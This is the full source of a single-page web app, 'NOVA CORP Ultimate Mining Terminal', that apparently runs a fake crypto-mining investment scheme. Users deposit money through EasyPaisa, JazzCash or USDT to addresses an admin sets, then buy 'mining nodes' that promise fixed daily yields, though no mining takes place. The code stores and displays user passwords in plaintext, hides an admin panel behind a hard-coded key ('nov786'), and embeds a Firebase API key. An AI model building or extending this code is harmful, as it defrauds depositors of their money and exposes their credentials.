<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>NOVA CORP | Ultimate Mining Terminal</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;700;800&display=swap" rel="stylesheet">
    <style>
        :root { --gold: #D4AF37; --dark: #0F172A; }
        body { background: #F8FAFC; font-family: 'Plus Jakarta Sans', sans-serif; color: #1e293b; -webkit-tap-highlight-color: transparent; }
        .premium-card { background: white; border: 1px solid #e2e8f0; border-radius: 24px; box-shadow: 0 4px 20px rgba(0,0,0,0.02); transition: 0.3s; }
        .btn-gold { background: linear-gradient(135deg, #D4AF37, #B8860B); color: white; border-radius: 16px; font-weight: 800; cursor: pointer; border: none; transition: 0.2s; }
        .btn-gold:active { transform: scale(0.96); }
        .screen { display: none; }
        .active-screen { display: block; animation: slideUp 0.4s ease-out; }
        @keyframes slideUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
        .nav-bar { position: fixed; bottom: 0; width: 100%; background: rgba(255,255,255,0.9); backdrop-filter: blur(15px); border-top: 1px solid #e2e8f0; display: flex; justify-content: space-around; padding: 15px 5px; z-index: 1000; }
        .nav-item { color: #94a3b8; font-size: 8px; font-weight: 800; display: flex; flex-direction: column; align-items: center; gap: 5px; }
        .nav-item.active { color: var(--gold); }
        input { border: 1px solid #e2e8f0 !important; font-size: 14px !important; transition: 0.3s; }
        input:focus { border-color: var(--gold) !important; box-shadow: 0 0 0 2px rgba(212,175,55,0.1); }
        .admin-badge { background: rgba(239, 68, 68, 0.1); color: #ef4444; padding: 2px 8px; border-radius: 20px; font-size: 8px; font-weight: 800; }
    </style>
</head>
<body>

    <div id="auth-screen" class="active-screen">
        <section class="p-8 text-center bg-white min-h-screen flex flex-col justify-center">
            <h1 class="text-5xl font-black text-slate-900 tracking-tighter">NO<span class="text-[#D4AF37]">VA</span></h1>
            <p class="text-[9px] text-slate-400 font-bold uppercase tracking-[8px] mt-2 mb-12">Institutional Mining</p>
            <div class="space-y-4 max-w-xs mx-auto w-full">
                <input type="text" id="u-id" placeholder="Username" class="w-full p-4 rounded-2xl outline-none">
                <input type="password" id="u-pw" placeholder="Password" class="w-full p-4 rounded-2xl outline-none">
                <button onclick="handleAuth()" class="w-full btn-gold py-4 uppercase text-xs tracking-widest">Connect Terminal</button>
                <p onclick="toggleAuthMode()" id="auth-toggle" class="text-[10px] text-slate-400 font-bold uppercase cursor-pointer underline mt-4">Create New Account</p>
            </div>
        </section>
    </div>

    <div id="app" class="hidden">
        <header class="p-5 flex justify-between items-center bg-white border-b sticky top-0 z-[100]">
            <h2 id="logo-main" class="font-black text-2xl tracking-tighter cursor-pointer select-none">NO<span class="text-[#D4AF37]">VA</span></h2>
            <div class="text-right">
                <p id="user-display" class="text-[10px] font-black uppercase">@USER</p>
                <div class="flex items-center gap-1 justify-end"><span class="w-1.5 h-1.5 bg-green-500 rounded-full animate-pulse"></span><span class="text-[8px] font-bold text-slate-400 uppercase">Live Connection</span></div>
            </div>
        </header>

        <div id="page-dash" class="screen active-screen px-4 pt-6 pb-24">
            <div class="bg-slate-900 rounded-[32px] p-8 mb-6 text-white shadow-2xl relative overflow-hidden">
                <div class="relative z-10">
                    <p class="text-[8px] text-slate-500 font-bold uppercase tracking-widest mb-1">Total Assets</p>
                    <h1 id="b-main" class="text-5xl font-black tracking-tighter mb-8">$0.00</h1>
                    <div class="grid grid-cols-2 gap-4 border-t border-white/10 pt-6">
                        <div><p class="text-[7px] text-slate-500 font-bold uppercase">Daily Yield</p><p id="b-daily" class="text-lg font-black text-green-400">+$0.00</p></div>
                        <div class="text-right"><p class="text-[7px] text-slate-500 font-bold uppercase">Total Profit</p><p id="b-total" class="text-lg font-black text-[#D4AF37]">$0.00</p></div>
                    </div>
                </div>
            </div>
            <div class="grid grid-cols-2 gap-4 mb-6">
                <button onclick="openModal('modal-dep')" class="premium-card p-6 flex flex-col items-center gap-2"><i class="fa-solid fa-circle-plus text-[#D4AF37] text-xl"></i><span class="text-[10px] font-black">DEPOSIT</span></button>
                <button onclick="openModal('modal-wd')" class="premium-card p-6 flex flex-col items-center gap-2"><i class="fa-solid fa-money-bill-transfer text-slate-400 text-xl"></i><span class="text-[10px] font-black">WITHDRAW</span></button>
            </div>
        </div>

        <div id="page-nodes" class="screen px-4 pt-6 pb-24">
            <h3 class="text-center font-black text-sm uppercase mb-6 tracking-widest">Active Mining <span class="text-[#D4AF37]">Nodes</span></h3>
            <div id="nodes-container" class="space-y-4"></div>
        </div>

        <div id="page-logs" class="screen px-4 pt-6 pb-24">
            <h3 class="text-center font-black text-sm uppercase mb-6">History & <span class="text-[#D4AF37]">Logs</span></h3>
            <div id="logs-container" class="space-y-3"></div>
        </div>

        <div id="page-admin" class="screen px-4 pt-6 pb-24">
            <div class="flex justify-between items-center mb-6"><h2 class="text-xl font-black text-red-600 uppercase">Master Admin</h2><span class="admin-badge">AUTHORIZED ACCESS</span></div>
            
            <div class="premium-card p-5 mb-6 bg-slate-900 text-white">
                <h3 class="text-[10px] font-bold text-slate-500 uppercase mb-4 border-b border-white/10 pb-2">Set Deposit Numbers</h3>
                <div class="space-y-3">
                    <input type="text" id="adm-ep" placeholder="EasyPaisa No" class="w-full p-3 rounded-xl text-slate-900 outline-none">
                    <input type="text" id="adm-jc" placeholder="JazzCash No" class="w-full p-3 rounded-xl text-slate-900 outline-none">
                    <input type="text" id="adm-usdt" placeholder="USDT Address" class="w-full p-3 rounded-xl text-slate-900 outline-none">
                    <button onclick="updateSystemWallets()" class="w-full btn-gold py-3 text-xs">Save All Numbers</button>
                </div>
            </div>

            <div class="premium-card p-5 mb-6">
                <h3 class="text-[10px] font-black uppercase mb-4 text-slate-400">User Management</h3>
                <div id="adm-user-list" class="space-y-2 max-h-80 overflow-y-auto pr-1">
                    <p class="text-center text-[10px] text-slate-400">Loading users...</p>
                </div>
            </div>

            <h3 class="text-[10px] font-black uppercase mb-3">Pending Approvals</h3>
            <div id="adm-approvals" class="space-y-3"></div>
        </div>

        <nav class="nav-bar">
            <div onclick="nav('page-dash', this)" class="nav-item active"><i class="fa-solid fa-home text-lg"></i><span>HOME</span></div>
            <div onclick="nav('page-nodes', this)" class="nav-item"><i class="fa-solid fa-microchip text-lg"></i><span>HARDWARE</span></div>
            <div onclick="nav('page-logs', this)" class="nav-item"><i class="fa-solid fa-clock-rotate-left text-lg"></i><span>LOGS</span></div>
            <div id="nav-admin-btn" onclick="nav('page-admin', this)" class="nav-item text-red-500" style="display: none;"><i class="fa-solid fa-user-gear text-lg"></i><span>ADMIN</span></div>
            <div onclick="logout()" class="nav-item"><i class="fa-solid fa-power-off text-lg text-red-400"></i><span>EXIT</span></div>
        </nav>
    </div>

    <div id="modal-dep" class="fixed inset-0 bg-white z-[2000] p-8 hidden overflow-y-auto">
        <div class="flex justify-between items-center mb-8"><h2 class="font-black text-xl">DEPOSIT FUNDS</h2><i onclick="closeModal('modal-dep')" class="fa-solid fa-xmark text-xl"></i></div>
        <div class="grid grid-cols-3 gap-2 mb-6">
            <button onclick="selDepWay('EP')" class="border p-3 rounded-xl text-[9px] font-bold">EasyPaisa</button>
            <button onclick="selDepWay('JC')" class="border p-3 rounded-xl text-[9px] font-bold">JazzCash</button>
            <button onclick="selDepWay('USDT')" class="border p-3 rounded-xl text-[9px] font-bold">USDT</button>
        </div>
        <div id="dep-info-box" class="bg-slate-50 p-6 rounded-2xl text-center mb-8 hidden">
            <p id="dep-method-name" class="text-[8px] font-black text-slate-400 uppercase mb-1"></p>
            <p id="dep-method-addr" class="text-sm font-black text-slate-900 break-all"></p>
        </div>
        <div class="space-y-4">
            <input type="number" id="in-amt" placeholder="Amount ($)" class="w-full p-4 border rounded-2xl outline-none">
            <input type="text" id="in-tx" placeholder="Transaction ID / Hash" class="w-full p-4 border rounded-2xl outline-none">
            <button onclick="submitFinance('Deposit')" class="w-full btn-gold py-4">SUBMIT DEPOSIT</button>
        </div>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
        import { getFirestore, doc, setDoc, getDoc, updateDoc, addDoc, collection, onSnapshot, query, where, getDocs, deleteDoc } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";

        const firebaseConfig = { apiKey: "AIzaSyAXlQ1tKTJbcnIXNeww9I3d-ukzD7_mUCo", authDomain: "home-94d45.firebaseapp.com", projectId: "home-94d45", appId: "1:964390949419:web:589840cb91b7e42ecd506e" };
        const app = initializeApp(firebaseConfig); const db = getFirestore(app);

        let currentUser = localStorage.getItem('nova_session');
        let authMode = 'login'; let admClicks = 0;
        let sys = { ep: "Not Set", jc: "Not Set", usdt: "Not Set" };

        const nodesList = [{id:1, n:"Micro Node", c:10, y:0.9}, {id:2, n:"Beta-1", c:25, y:2.5}, {id:3, n:"Core-X", c:50, y:6.0}];
        for(let i=4; i<=21; i++) nodesList.push({id:i, n:`Industrial V${i}`, c:100+(i*50), y:15+(i*5)});

        // Admin Secret Trigger
        document.getElementById('logo-main').onclick = () => {
            admClicks++;
            if(admClicks >= 5) {
                if(prompt("Admin Access Key:") === "nov786") {
                    document.getElementById('nav-admin-btn').style.display = "flex";
                    loadMasterUserList();
                    alert("Admin Control Panel Unlocked!");
                }
                admClicks = 0;
            }
        };

        window.handleAuth = async () => {
            const id = document.getElementById('u-id').value.toLowerCase().trim();
            const pw = document.getElementById('u-pw').value;
            if(!id || !pw) return alert("Required fields missing");
            const uRef = doc(db, "users", id); const snap = await getDoc(uRef);
            if(authMode === 'login') {
                if(snap.exists() && snap.data().password === pw) {
                    localStorage.setItem('nova_session', id); location.reload();
                } else alert("Invalid username or password");
            } else {
                if(snap.exists()) return alert("User already registered");
                await setDoc(uRef, { balance: 0, password: pw, daily: 0, total_profit: 0, active_nodes: [], status: 'Active', joined: Date.now() });
                localStorage.setItem('nova_session', id); location.reload();
            }
        };

        async function loadMasterUserList() {
            const snap = await getDocs(collection(db, "users"));
            const box = document.getElementById('adm-user-list');
            box.innerHTML = "";
            snap.forEach(uDoc => {
                const u = uDoc.data();
                box.innerHTML += `<div class="p-3 border rounded-xl flex justify-between items-center bg-slate-50">
                    <div><p class="text-[10px] font-black">@${uDoc.id}</p><p class="text-[8px] text-slate-400">PW: ${u.password}</p></div>
                    <div class="text-right">
                        <p class="text-[10px] font-bold text-green-600">$${(u.balance || 0).toFixed(2)}</p>
                        <button onclick="deleteUser('${uDoc.id}')" class="text-[8px] text-red-500 font-bold uppercase">Remove</button>
                    </div>
                </div>`;
            });
        }

        window.updateSystemWallets = async () => {
            const data = { 
                ep: document.getElementById('adm-ep').value || sys.ep, 
                jc: document.getElementById('adm-jc').value || sys.jc, 
                usdt: document.getElementById('adm-usdt').value || sys.usdt 
            };
            await setDoc(doc(db, "config", "master"), data, { merge: true });
            alert("Deposit numbers updated in Cloud Database!");
        };

        function startApp(id) {
            document.getElementById('auth-screen').style.display = 'none';
            document.getElementById('app').classList.remove('hidden');
            onSnapshot(doc(db, "users", id), d => {
                const u = d.data(); if(!u) return;
                document.getElementById('user-display').innerText = `@${id}`;
                document.getElementById('b-main').innerText = `$${(u.balance || 0).toFixed(2)}`;
                document.getElementById('b-daily').innerText = `+$${(u.daily || 0).toFixed(2)}`;
                document.getElementById('b-total').innerText = `$${(u.total_profit || 0).toFixed(2)}`;
                renderNodes(u.active_nodes || []);
            });
            onSnapshot(doc(db, "config", "master"), d => { if(d.exists()) sys = d.data(); });
            loadUserLogs(id); loadPendingApprovals();
        }

        function renderNodes(active) {
            const cont = document.getElementById('nodes-container'); cont.innerHTML = "";
            nodesList.forEach(n => {
                const isRun = active.find(a => a.nodeId === n.id);
                cont.innerHTML += `<div class="premium-card p-5 flex justify-between items-center">
                    <div><h4 class="font-black text-xs uppercase">${n.n}</h4><p class="text-[9px] text-slate-400">$${n.c} • Yield: $${n.y}/Day</p></div>
                    ${isRun ? `<span class="text-green-500 font-bold text-[9px] tracking-widest animate-pulse">MINING...</span>` : `<button onclick="buyNode(${n.id}, ${n.c}, ${n.y})" class="btn-gold px-6 py-2 text-[10px]">PURCHASE</button>`}
                </div>`;
            });
        }

        window.buyNode = async (id, cost, y) => {
            const uRef = doc(db, "users", currentUser); const snap = await getDoc(uRef);
            if(snap.data().balance < cost) return alert("Insufficient Balance");
            await updateDoc(uRef, { balance: snap.data().balance - cost, active_nodes: [...(snap.data().active_nodes || []), { nodeId: id, yield: y, time: Date.now() }], daily: (snap.data().daily || 0) + y });
            alert("Hardware activation successful!");
        };

        window.selDepWay = (t) => {
            document.getElementById('dep-info-box').classList.remove('hidden');
            document.getElementById('dep-method-name').innerText = t + " RECEIVE ADDRESS";
            document.getElementById('dep-method-addr').innerText = sys[t.toLowerCase()] || "System updating...";
        };

        window.submitFinance = async (type) => {
            const amt = parseFloat(document.getElementById('in-amt').value);
            const tx = document.getElementById('in-tx').value;
            if(!amt || !tx) return alert("Please fill all details");
            await addDoc(collection(db, "logs"), { user: currentUser, type, amount: amt, ref: tx, status: 'Pending', time: Date.now() });
            alert("Request sent to admin for verification!"); closeModal('modal-dep');
        };

        async function loadPendingApprovals() {
            onSnapshot(query(collection(db, "logs"), where("status", "==", "Pending")), s => {
                const list = document.getElementById('adm-approvals'); list.innerHTML = "";
                s.forEach(ds => {
                    const l = ds.data();
                    list.innerHTML += `<div class="premium-card p-4 text-[9px] flex justify-between items-center">
                        <div><p><b>User:</b> ${l.user}</p><p><b>${l.type}:</b> $${l.amount}</p><p class="text-slate-400">ID: ${l.ref}</p></div>
                        <button onclick="approveAction('${ds.id}', '${l.user}', ${l.amount}, '${l.type}')" class="bg-green-600 text-white px-4 py-2 rounded-xl font-bold">APPROVE</button>
                    </div>`;
                });
            });
        }

        window.approveAction = async (lid, uid, amt, type) => {
            const uRef = doc(db, "users", uid); const s = await getDoc(uRef);
            if(type === 'Deposit') await updateDoc(uRef, { balance: (s.data().balance || 0) + amt });
            await updateDoc(doc(db, "logs", lid), { status: 'Approved' });
            alert("Request approved!");
        }

        window.deleteUser = async (id) => { if(confirm(`Delete @${id}?`)) await deleteDoc(doc(db, "users", id)); alert("User deleted."); loadMasterUserList(); };
        window.nav = (id, el) => { document.querySelectorAll('.screen').forEach(s => s.classList.remove('active-screen')); document.getElementById(id).classList.add('active-screen'); document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active')); el.classList.add('active'); };
        window.openModal = (id) => document.getElementById(id).classList.remove('hidden');
        window.closeModal = (id) => document.getElementById(id).classList.add('hidden');
        window.logout = () => { localStorage.clear(); location.reload(); };
        window.toggleAuthMode = () => { authMode = authMode === 'login' ? 'reg' : 'login'; document.getElementById('auth-toggle').innerText = authMode === 'login' ? "Create New Account" : "Back to Login"; };

        if(currentUser) startApp(currentUser);
    </script>
</body>
</html>
